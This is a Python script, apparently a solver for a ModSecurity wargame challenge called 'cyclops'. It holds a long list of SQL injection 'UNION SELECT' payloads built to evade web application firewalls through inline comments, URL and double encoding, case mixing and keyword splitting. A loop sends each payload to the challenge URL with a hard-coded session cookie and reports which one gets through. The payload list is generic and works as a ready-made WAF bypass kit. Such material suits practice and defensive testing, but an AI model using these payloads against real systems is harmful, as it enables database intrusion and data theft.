#Union select Waf bypass list
import requests

bypass_list = '''/*!50000%55nIoN*/ /*!50000%53eLeCt*/
%55nion(%53elect 1,2,3)-- -
+union+distinct+select+
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//*--*//*!all*//*--*//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+UnIoN/*&a=*/SeLeCT/*&a=*/
union+sel%0bect
+uni*on+sel*ect+
+#1q%0Aunion all#qa%0A#%0Aselect
union(select (1),(2),(3),(4),(5))
UNION(SELECT(column)FROM(table))
%23xyz%0AUnIOn%23xyz%0ASeLecT+
%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
union(select(1),2,3)
union (select 1111,2222,3333)
uNioN (/*!/**/ SeleCT */ 11)
union (select 1111,2222,3333)
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
/union\sselect/g
/union\s+select/i
/*!UnIoN*/SeLeCT
+UnIoN/*&a=*/SeLeCT/*&a=*/
+uni>on+sel>ect+
+(UnIoN)+(SelECT)+
+(UnI)(oN)+(SeL)(EcT)
+’UnI”On’+'SeL”ECT’
+uni on+sel ect+
+/*!UnIoN*/+/*!SeLeCt*/+
/*!u%6eion*/ /*!se%6cect*/
uni%20union%20/*!select*/%20
union%23aa%0Aselect
/**/union/*!50000select*/
/^.*union.*$/ /^.*select.*$/
/*union*/union/*select*/select+
/*uni X on*/union/*sel X ect*/
+un/**/ion+sel/**/ect+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?<ion sel="">+un/**/ion+se/**/lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*!UnIoN*/SeLecT+'''
bypass_list = bypass_list.split("\n")

bypass_list[6]

url = "https://modsec.rubiya.kr/chall/cyclops_9d6a565d1cb6c38a06a6b0815344e29e.php"
params = {'id': None}
cookies = {'PHPSESSID' : '595dl7ejl1io50mt9bhg0dbmpk'}

for bypass in bypass_list:
    # url에 바로 넣기 (인코딩 추가로 안함)
    payload1="?id='<@=1%20{}%20'first','second'%23".format(bypass)
    # params에 넣기 인코딩 함.
    payload2="'<@=1 {} 'first','second'#".format(bypass)
    response = requests.get(url+payload1,cookies=cookies)
    if("CYCLOPS Clear" in response.text):
        #print("may be success")
        print(payload1)
        #print(response.text)


    